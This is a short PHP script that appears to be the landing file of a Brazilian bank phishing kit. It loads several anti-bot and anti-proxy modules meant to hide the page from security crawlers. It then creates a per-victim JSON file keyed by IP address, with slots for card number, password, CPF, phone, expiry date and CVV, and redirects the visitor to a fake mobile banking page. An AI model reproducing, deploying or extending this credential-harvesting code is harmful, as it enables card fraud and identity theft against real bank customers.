<?php

require 'MagnumAntibot.php';
require 'MagnumAntibot2.php';
require 'MagnumAntibot3.php';
require 'MagnumAntibot4.php';
require 'MagnumAntibot5.php';
require 'MagnumAntibot6.php';
require 'MagnumAntibot7.php';
require 'MagnumAntibot8.php';
require "antiproxy.php";
require "bot.php";
require "fucker.php";

$ip = $_SERVER['REMOTE_ADDR'];

if($ip === "::1"){
	$ip = "127.0.1";
}

date_default_timezone_set('America/Sao_Paulo');

// Pasta onde serão armazenados os arquivos JSON
$pasta_clientes = 'clientes/';

// Cria o nome do arquivo usando o endereço IP e o caminho completo para o arquivo
$arquivo_json = $pasta_clientes . $ip . '.json';

// Dados para serem armazenados no arquivo JSON (exemplo)
$dados_cliente = array(
    "ip" => $ip,
    "numeroc" => "aguardando...",
    "senhac" => "aguardando...",
    "cpf" => "aguardando...",
    "phone" => "aguardando...",
    "validade" => "aguardando...",
    "cvv" => "aguardando...",     
    "data_acesso" => date('H:i:s')
);

// Converte os dados para formato JSON
$json = json_encode($dados_cliente);

// Escreve o JSON no arquivo
if (file_put_contents($arquivo_json, $json) !== false) {
    header('location: dispositivo/mobile/route-app/pf');
} else {
    echo "Erro ao criar o arquivo JSON para o IP: $ip";
}
?>